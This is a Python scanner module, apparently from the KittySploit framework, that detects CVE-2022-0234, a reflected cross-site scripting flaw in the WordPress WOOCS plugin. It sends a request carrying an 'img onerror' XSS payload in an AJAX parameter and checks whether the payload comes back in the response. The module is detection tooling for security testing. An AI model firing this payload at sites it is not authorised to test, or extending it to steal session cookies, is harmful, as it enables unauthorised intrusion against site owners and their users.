#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress WOOCS plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress WOOCS < 1.3.7.5 - Cross-Site Scripting Detection',
        'description': 'WordPress WOOCS plugin before 1.3.7.5 is susceptible to cross-site scripting. The plugin does not sanitize and escape the woocs_in_order_currency parameter of the woocs_get_products_price_html AJAX action, available to both unauthenticated and authenticated users, before outputting it back in the response. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'wpscan', 'wordpress', 'wp-plugin', 'wp', 'xss', 'woocs', 'pluginus', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/fd568a1f-bd51-41bb-960d-f8573b84527b',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0234',
            'https://plugins.trac.wordpress.org/changeset/2659191',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0234',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0234',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?action=woocs_get_products_price_html&woocs_in_order_currency=<img%20src%20onerror=alert(document.domain)>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src onerror=alert(document.domain)>', '"current_currency":',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress WOOCS < 1.3.7.5 - Cross-Site Scripting detected', path=path)
            return True
        return False

